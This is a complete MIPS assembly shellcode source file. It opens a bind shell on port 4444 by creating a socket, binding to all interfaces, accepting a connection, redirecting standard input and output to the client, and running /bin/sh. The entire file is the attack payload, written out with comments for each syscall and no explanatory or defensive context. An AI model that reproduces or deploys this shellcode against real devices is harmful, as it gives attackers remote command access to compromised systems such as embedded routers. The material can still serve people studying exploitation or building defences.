.section .text
.global __start

.equ PORT, 0x115c # 4444 (big endian)

__start:
    # socket(AF_INET, SOCK_STREAM, 0) (2, 2, 0)
    
    slti $a2, $zero, -1
    xor $a0, $zero, 0x1337
    xor $a1, $a0, 0x1335
    xor $a0, $a0, 0x1335

    li $v0, 4183
    syscall 0x040405

    sw $v0, -0x14($sp)

    # bind(sockfd, &saddr, 0x10)

    lw $a0, -0x14($sp)

    lui $t1, 0x1002 # sizeof(sockaddr_in) + AF_INET 
    ori $t1, PORT # Port: 4444
    sw $t1, -0x10($sp)

    lbu $a2, -0x10($sp)
    sb $zero, -0x10($sp)

    sw $zero, -0xc($sp) # Bind IP Address: 0.0.0.0
    la $a1, -0x10($sp)

    li $v0, 4169 # SYS_bind
    syscall 0x040505

    # listen(sockfd, 0x1337)

    ld $a0, -0x14($sp)
    li $a1, 0x1337

    li $v0, 4174
    syscall 0x040505

    # accept(sockfd, NULL, NULL)

    ld $a0, -0x14($sp)
    slti $a1, $zero, -1
    slti $a2, $zero, -1

    li $v0, 4168
    syscall 0x040505

    sw $v0, -0x18($sp)

    # dup2(clientfd, [0, 1])

    lw $a0, -0x18($sp)
    slti $a1, $zero, -1

    li $v0, 4063 # SYS_dup2
    syscall 0x040505

    slti $a1, $zero, 0x1337
    li $v0, 4063 # SYS_dup2
    syscall 0x040505

    # execve("/bin/sh", NULL, NULL)

    lui $t1, 0x2f62 # /b
    ori $t1, 0x696e # in
    lui $t3, 0x2f2f # //
    ori $t3, 0x7368 # sh

    sw $t1, -0x10($sp)
    sw $t3, -0xc($sp)
    sw $zero, -0x8($sp)

    slti $a1, $zero, -1
    slti $a2, $zero, -1

    la $a0, -0x10($sp)

    li $v0, 4011 # SYS_execve
    syscall 0x040405
